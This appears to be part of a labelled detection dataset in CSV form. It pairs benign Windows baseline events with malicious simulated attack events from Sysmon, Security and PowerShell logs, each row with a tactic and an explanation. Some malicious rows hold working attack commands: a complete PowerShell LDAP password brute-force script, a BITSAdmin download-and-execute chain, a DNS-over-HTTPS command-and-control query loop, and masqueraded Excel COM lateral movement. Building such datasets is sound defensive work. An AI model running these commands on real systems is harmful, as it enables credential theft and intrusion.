+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe C:\Users\admin_test\Desktop\test.ps1; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
+CYB499-028,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,5,2024-10-25 17:02:54.5648412,Server002,SERVER002\admin_test,C:\Windows\System32\bitsadmin.exe,,,,,,,,Sysmon event 5 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\bitsadmin.exe; user=SERVER002\admin_test,The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: C:\Windows\System32\bitsadmin.exe
+CYB499-029,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-18T09:31:35.5291060+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Windows\System32\AggregatorHost.exe,AggregatorHost.exe,C:\Windows\System32\svchost.exe,,,,,,Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\AggregatorHost.exe; cmd=AggregatorHost.exe; parent=C:\Windows\System32\svchost.exe; parent_cmd=C:\Windows\System32\svchost.exe -k utcsvc -p; user=NT AUTHORITY\SYSTEM; detail=Process creation,Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
+CYB499-030,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-29T10:30:17.9732915+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Windows\SoftwareDistribution\Download\Install\AM_Engine.exe,"""C:\Windows\SoftwareDistribution\Download\Install\AM_Engine.exe""",C:\Windows\System32\wuauclt.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\SoftwareDistribution\Download\Install\AM_Engine.exe; cmd=""C:\Windows\SoftwareDistribution\Download\Install\AM_Engine.exe""; parent=C:\Windows\System32\wuauclt.exe; parent_cmd=""C:\Windows\system32\wuauclt.exe"" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId 987b49e6-49dc-4a07-bf32-7abfd3f81174 /RunHandlerComServer; user=NT AUTHORITY\SYSTEM; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
+CYB499-031,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-05-03T05:39:14.0849214+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.566.0.exe,"""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.566.0.exe"" WD /q",C:\Windows\System32\wuauclt.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.566.0.exe; cmd=""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.566.0.exe"" WD /q; parent=C:\Windows\System32\wuauclt.exe; parent_cmd=""C:\Windows\system32\wuauclt.exe"" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId 25915946-df3d-42f1-a2c2-71f13ef089a1 /RunHandlerComServer; user=NT AUTHORITY\SYSTEM; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
+CYB499-032,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T19:53:42.4481644+00:00,Server002,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,"Available, None, 	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.2673
+	HostId=84f614d2-2144-436b-ac5d-0bdc43f37db1
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=5.1.19041.2673
+	RunspaceId=bccbac07-f26c-46e1-87f1-2382e4751ce7
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
+CYB499-033,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,5024,2025-04-30T08:09:42.5427166+00:00,Server002,,,,,,,,,,Security event 5024 from Microsoft-Windows-Security-Auditing on Server002,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
+CYB499-034,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4648,2025-04-30T10:09:32.2344012+00:00,Server002,WORKGROUP\SERVER002$,C:\Windows\System32\wininit.exe,C:\Windows\System32\wininit.exe,,,,,,,Security event 4648 from Microsoft-Windows-Security-Auditing on Server002; image=C:\Windows\System32\wininit.exe; cmd=C:\Windows\System32\wininit.exe; user=WORKGROUP\SERVER002$; detail=A logon was attempted using explicit credentials,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
+CYB499-035,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-06-22T20:35:58.4996774+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Windows\SoftwareDistribution\Download\Install\AM_Engine_Patch_1.1.25030.1.exe,"""C:\Windows\SoftwareDistribution\Download\Install\AM_Engine_Patch_1.1.25030.1.exe""",C:\Windows\System32\wuauclt.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\SoftwareDistribution\Download\Install\AM_Engine_Patch_1.1.25030.1.exe; cmd=""C:\Windows\SoftwareDistribution\Download\Install\AM_Engine_Patch_1.1.25030.1.exe""; parent=C:\Windows\System32\wuauclt.exe; parent_cmd=""C:\Windows\system32\wuauclt.exe"" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId 5f5c3015-3fc9-43e8-9e42-a32730d1490a /RunHandlerComServer; user=NT AUTHORITY\SYSTEM; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
+CYB499-036,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-18T10:37:30.2691294+00:00,Server002,SERVER002\lplui,C:\Program Files\WindowsApps\Microsoft.Microsoft3DViewer_7.2502.5012.0_x64__8wekyb3d8bbwe\3DViewer.exe,"""C:\Program Files\WindowsApps\Microsoft.Microsoft3DViewer_7.2502.5012.0_x64__8wekyb3d8bbwe\3DViewer.exe"" -ServerName:Microsoft.Microsoft3DViewer.AppXee4wbwh7vy3ejyrqsebr3ybk1vd6bkyn.mca",,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Program Files\WindowsApps\Microsoft.Microsoft3DViewer_7.2502.5012.0_x64__8wekyb3d8bbwe\3DViewer.exe; cmd=""C:\Program Files\WindowsApps\Microsoft.Microsoft3DViewer_7.2502.5012.0_x64__8wekyb3d8bbwe\3DViewer.exe"" -ServerName:Microsoft.Microsoft3DViewer.AppXee4wbwh7vy3ejyrqsebr3ybk1vd6...; parent_cmd=-; user=SERVER002\lplui; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
+CYB499-037,Malicious,Sysmon,Discovery,discovery_discover_system_language_withchcp,data/raw/malicious/discovery_discover_system_language_withchcp_json/T1614.001-2_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-28 16:20:50.9618727,Server002,SERVER002\admin_test,C:\Windows\System32\chcp.com,chcp,C:\Windows\System32\cmd.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\chcp.com; cmd=chcp; parent=C:\Windows\System32\cmd.exe; parent_cmd=""cmd.exe"" /c chcp; user=SERVER002\admin_test","The event uses chcp to inspect the system code page, which can reveal language or locale information. Evidence: chcp"
+CYB499-038,Malicious,PowerShell,Command and Control,c2c_dns_https_largequeryvolume,data/raw/malicious/c2c_dns_https_largequeryvolume_json/T1572-1_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-28 15:11:15.6989974,Server002,,,"powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}",,,,,,"Environment, Started, 	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d
+	HostApplication=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBa...","The event shows a PowerShell-driven DNS-over-HTTPS style query loop to 8.8.8.8 with randomized xip.io hostnames. Evidence: powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}"
+CYB499-039,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4799,2025-04-29T17:42:58.1310708+00:00,Server002,SERVER002\lplui (S-1-5-21-3962163828-2803415714-1403596700-1001),,,,,,,,,Security event 4799 from Microsoft-Windows-Security-Auditing on Server002; user=SERVER002\lplui (S-1-5-21-3962163828-2803415714-1403596700-1001); detail=A security-enabled local group membership was enumerated,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
+CYB499-040,Malicious,Sysmon,Execution,execution-app-uninstall-using-wmic,data/raw/malicious/execution-app-uninstall-using-wmic-json/T1047-10_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-22 15:28:01.0641173,Server002,SERVER002\admin_test,C:\Windows\System32\wbem\WMIC.exe,"wmic  /node:""127.0.0.1"" product where ""name like 'Tightvnc%%%%'"" call uninstall",C:\Windows\System32\cmd.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\wbem\WMIC.exe; cmd=wmic /node:""127.0.0.1"" product where ""name like 'Tightvnc%%%%'"" call uninstall; parent=C:\Windows\System32\cmd.exe; parent_cmd=""cmd.exe"" /c wmic /node:""127.0.0.1"" product where ""name like 'Tightvnc%%'"" call uninstall; user=SERVER002\admin_test","The event uses WMIC to uninstall a target product over WMI, which is execution behavior tied to the scenario. Evidence: wmic /node:""127.0.0.1"" product where ""name like 'Tightvnc%%%%'"" call uninstall"
+CYB499-041,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-25 17:02:54.6099364,Server002,SERVER002\admin_test,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe  /resume fileBITS,C:\Windows\System32\cmd.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\bitsadmin.exe; cmd=bitsadmin.exe /resume fileBITS; parent=C:\Windows\System32\cmd.exe; parent_cmd=""cmd.exe"" /c bitsadmin.exe /create fileBITS & bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %temp%\bitsadmin3_flag.p...; user=SERVER002\admin_test",The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: bitsadmin.exe /resume fileBITS
+CYB499-042,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,5,2025-04-18T09:31:56.4806820+00:00,Server002,NT AUTHORITY\SYSTEM,<unknown process>,<unknown process>,,,,,,,Sysmon event 5 from Microsoft-Windows-Sysmon on Server002; image=<unknown process>; cmd=<unknown process>; user=NT AUTHORITY\SYSTEM; detail=Process terminated,Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
+CYB499-043,Malicious,PowerShell,Command and Control,c2c_dns_https_largequeryvolume,data/raw/malicious/c2c_dns_https_largequeryvolume_json/T1572-1_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-28 15:11:15.7149743,Server002,,,"powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}",,,,,,"Variable, Started, 	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d
+	HostApplication=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBa...","The event shows a PowerShell-driven DNS-over-HTTPS style query loop to 8.8.8.8 with randomized xip.io hostnames. Evidence: powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}"
+CYB499-044,Malicious,Sysmon,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-21 11:25:00.3014313,Server002,SERVER002\admin_test,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe', $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\""""Excel.Application\"""",\""""localhost\"""")), $com.ActivateMicrosoftApp(\""""5\"""")}",,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; cmd=""powershell.exe"" & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe', $com = [System.Activator]::CreateInstance([type]::GetType...; user=SERVER002\admin_test","The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: ""powershell.exe"" & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe', $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\""""Excel.Application\"""",\""""lo..."
+CYB499-045,Malicious,PowerShell,Credential Access,credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP,data/raw/malicious/credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP_json/T1110.001-2_Windows PowerShell.json,PowerShell,Windows PowerShell,400,2024-10-24 13:19:18.8008788,Server002,,,"powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {",,,,,,"Available, None, 	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=4a335bbc-027a-41e8-a2ef-bc57ff7bb925
+	HostApplication=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
+ Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
+ exit 1
+}
+
+[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
+$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389)
+
+$passwordList = Get-Content -Path ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\passwords.txt""
+foreach ($password in $passwordList){
+ $credz = new-object System.Net.NetworkCredential(""$ENV:USERNAME"", $password, ""$env:UserDnsDomain"")
+ $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
+ try {
+ Write-Host "" [-] Attempting ${password} on account $ENV:USERNAME.""
+ $conn.bind()
+ # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+ Write-Host "" [!] $ENV:USERNAME:${password} are valid credentials!""
+ } catch {
+ Write-Host $_.Exception.Message
+ }
+}
+Write-Host ""End of bruteforce""}
+	EngineVersion=5.1.19041.5007
+	RunspaceId=f51dd722-90c0-4d26-9d8e-b9a7acc9f51e
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","PowerShell event 400 from PowerShell on Server002; cmd=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {","The PowerShell/LDAP content iterates passwords against Active Directory using System.DirectoryServices.Protocols. Evidence: powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {"
+CYB499-046,Malicious,PowerShell,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-21 11:25:00.9418620,Server002,,,powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',,,,,,"Alias, Started, 	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=bb6cac0a-46f5-4aad-9c14-28049a346862
+	HostApplication=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""localhost""))
+$com.ActivateMicrosoftApp(""5"")}
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+CYB499-047,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-25 17:02:54.5361282,Server002,SERVER002\admin_test,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe  /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md C:\Users\ADMIN_~1\AppData\Local\Temp\bitsadmin3_flag.ps1,C:\Windows\System32\cmd.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\bitsadmin.exe; cmd=bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md C:\Users\ADMIN_~1\AppData\Local\Temp\bitsadmin3_flag.ps1; parent=C:\Windows\System32\cmd.exe; parent_cmd=""cmd.exe"" /c bitsadmin.exe /create fileBITS & bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %temp%\bitsadmin3_flag.p...; user=SERVER002\admin_test",The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md C:\Users\ADMIN_~1\AppData\Local\Temp\bitsadmin3_flag.ps1
+CYB499-048,Malicious,PowerShell,Command and Control,c2c_dns_https_largequeryvolume,data/raw/malicious/c2c_dns_https_largequeryvolume_json/T1572-1_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-28 15:11:15.6944085,Server002,,,"powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}",,,,,,"Alias, Started, 	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d
+	HostApplication=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBa...","The event shows a PowerShell-driven DNS-over-HTTPS style query loop to 8.8.8.8 with randomized xip.io hostnames. Evidence: powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}"
+CYB499-049,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-22T13:56:25.8914277+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Program Files\Common Files\microsoft shared\ClickToRun\AppVShNotify.exe,"""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\AppVShNotify.exe""",C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Program Files\Common Files\microsoft shared\ClickToRun\AppVShNotify.exe; cmd=""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\AppVShNotify.exe""; parent=C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe; parent_cmd=""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe"" /service; user=NT AUTHORITY\SYSTEM; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
+CYB499-050,Malicious,PowerShell,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-21 11:25:01.0004325,Server002,,,powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',,,,,,"Function, Started, 	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=bb6cac0a-46f5-4aad-9c14-28049a346862
+	HostApplication=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""localhost""))
+$com.ActivateMicrosoftApp(""5"")}
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+CYB499-051,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-18T09:45:13.4615778+00:00,Server002,SERVER002\lplui,C:\Windows\System32\ApplicationFrameHost.exe,C:\Windows\system32\ApplicationFrameHost.exe -Embedding,,,,,,,Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\ApplicationFrameHost.exe; cmd=C:\Windows\system32\ApplicationFrameHost.exe -Embedding; parent_cmd=-; user=SERVER002\lplui; detail=Process creation,Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
+CYB499-052,Malicious,Sysmon,Execution,execute-powershell-script-via-word-dde,data/raw/malicious/execute-powershell-script-via-word-dde-json/T1559.002-2_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-28 07:38:11.6113119,Server002,SERVER002\admin_test,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c start ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\bin\DDE_Document.docx""",C:\Windows\System32\wsmprovhost.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\cmd.exe; cmd=""cmd.exe"" /c start ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\bin\DDE_Document.docx""; parent=C:\Windows\System32\wsmprovhost.exe; parent_cmd=C:\Windows\system32\wsmprovhost.exe -Embedding; user=SERVER002\admin_test","The command starts a DDE-enabled Word document, consistent with a document-based execution chain. Evidence: ""cmd.exe"" /c start ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\bin\DDE_Document.docx"""
+CYB499-053,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-17T15:54:21.4365943+00:00,Server002,SERVER002\lplui,C:\Windows\System32\backgroundTaskHost.exe,"""C:\Windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXnme9zjyebb2xnyygh6q9ev6p5d234br2.mca",C:\Windows\System32\svchost.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\backgroundTaskHost.exe; cmd=""C:\Windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXnme9zjyebb2xnyygh6q9ev6p5d234br2.mca; parent=C:\Windows\System32\svchost.exe; parent_cmd=C:\Windows\system32\svchost.exe -k DcomLaunch -p; user=SERVER002\lplui; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
+CYB499-054,Malicious,PowerShell,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-21 11:25:00.9418620,Server002,,,powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',,,,,,"Registry, Started, 	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=bb6cac0a-46f5-4aad-9c14-28049a346862
+	HostApplication=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""localhost""))
+$com.ActivateMicrosoftApp(""5"")}
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
